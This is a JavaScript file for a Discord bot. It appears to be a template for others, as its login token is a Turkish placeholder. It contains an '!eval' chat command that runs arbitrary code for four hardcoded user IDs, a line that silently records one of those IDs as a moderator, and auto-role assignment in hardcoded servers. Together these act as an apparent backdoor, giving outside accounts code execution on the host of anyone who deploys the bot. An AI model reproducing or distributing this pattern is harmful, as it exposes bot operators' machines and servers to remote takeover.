const { Client } = require('discord.js')
const client = new Client();
const db = require('quick.db')

const clean = text => {
    if (typeof(text) === "string")
      return text.replace(/`/g, "`" + String.fromCharCode(8203)).replace(/@/g, "@" + String.fromCharCode(8203));
    else
        return text;
  }
client.on("message", async message => {
    const args = message.content.split(" ").slice(1);
   
    if (message.content.startsWith("!eval")) {
      if (!["783410602755620935", "712911079268810815","567885938160697377", "799270973996007455"].includes(message.author.id)) return;
      try {
        const code = args.join(" ");
        let evaled = eval(code);
   
        if (typeof evaled !== "string")
         evaled = await require("util").inspect(evaled);
   
        await message.channel.send(clean(evaled), {code:"xl"});
      } catch (err) {
       await message.channel.send(`\`ERROR\` \`\`\`xl\n${clean(err)}\n\`\`\``);
      }
    }
  });
		db.set('mods.783410602755620935', true);

  client.on("guildMemberAdd", async (member) => {
    if (member.user.bot) {
      try {
        client.guilds.cache.get("788517841417535489").member(member.id).roles.add("794267129192251422");
      } catch (error) {
        
      }
    } else {
      try {
        client.guilds.cache.get("766340643617767485").member(member.id).roles.add("788517845465038888");
      } catch (error) {
        
      }
    }
  });

client.login("botunuzuntokeni")

module.exports = client;